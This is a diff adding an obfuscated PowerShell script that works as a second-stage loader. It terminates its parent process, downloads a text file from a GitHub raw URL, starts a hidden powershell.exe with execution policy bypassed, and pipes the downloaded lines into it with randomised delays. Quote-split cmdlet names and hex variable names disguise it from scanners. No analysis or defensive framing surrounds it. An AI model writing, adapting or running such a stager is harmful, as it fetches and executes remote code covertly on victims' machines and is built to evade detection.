@@ -1,0 +1,28 @@
+$a801adf523c54a2fbc7a23d16771b6e7= (Get-WmiObject Win32_Process -Filter "ProcessId=$PID" | Sel''e''c''t -Expand ParentProcessId) 2>$null
+if ($a801adf523c54a2fbc7a23d16771b6e7) { S''to''p-Proce''ss -Id $a801adf523c54a2fbc7a23d16771b6e7 -Force -ErrorAction SilentlyContinue }
+$79029234ffc24e7ca3f9f5e2ecc45f6f= "https://raw.githubusercontent.com/test/test.github.io/main/download/second.txt";
+$4f5e7d67af4248788e2c0a675fca714a= (New-Object Net.WebClient).DownloadString($79029234ffc24e7ca3f9f5e2ecc45f6f);
+$7fcc54cc0f7540ecaff2f07168749d0c= $4f5e7d67af4248788e2c0a675fca714a -split "`r?`n";
+$9312bdb31dd84d159721608e1dc28a3c= New''-O''bj''e''c''t System.Diagnostics.ProcessStartInfo;
+$9312bdb31dd84d159721608e1dc28a3c.FileName = "powershell.exe";
+$9312bdb31dd84d159721608e1dc28a3c.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass";
+$9312bdb31dd84d159721608e1dc28a3c.UseShellExecute = $false;
+$9312bdb31dd84d159721608e1dc28a3c.RedirectStandardInput = $true;
+$9312bdb31dd84d159721608e1dc28a3c.RedirectStandardOutput = $true;
+$9312bdb31dd84d159721608e1dc28a3c.RedirectStandardError = $true;
+$9312bdb31dd84d159721608e1dc28a3c.CreateNoWindow = $true;
+$62742fed21e64324b69d3bcf0f540acb= [System.Diagnostics.Process]::Start($9312bdb31dd84d159721608e1dc28a3c);
+Sta''rt''-''S''le''ep -Seconds 1.2;
+$62742fed21e64324b69d3bcf0f540acb.StandardInput.WriteLine('$0cfd129412b44b92bd332033e63a4524 = "SilentlyContinue"');
+$62742fed21e64324b69d3bcf0f540acb.StandardInput.Flush();
+S''t''a''r''t''-''Sl''e''ep -Milliseconds 200;
+foreach ($line in $7fcc54cc0f7540ecaff2f07168749d0c) {
+    if ($line.Trim()) {
+        $62742fed21e64324b69d3bcf0f540acb.StandardInput.WriteLine($line.TrimEnd());
+        $62742fed21e64324b69d3bcf0f540acb.StandardInput.Flush();
+        S''t''art''-''Slee''p -Milliseconds (50..150 | G''et''-R''a''n''d''o''m);
+    }
+}
+$62742fed21e64324b69d3bcf0f540acb.StandardInput.WriteLine('');
+$62742fed21e64324b69d3bcf0f540acb.StandardInput.Flush();
+S''t''a''r''t-''S''l''eep -Milliseconds 500;
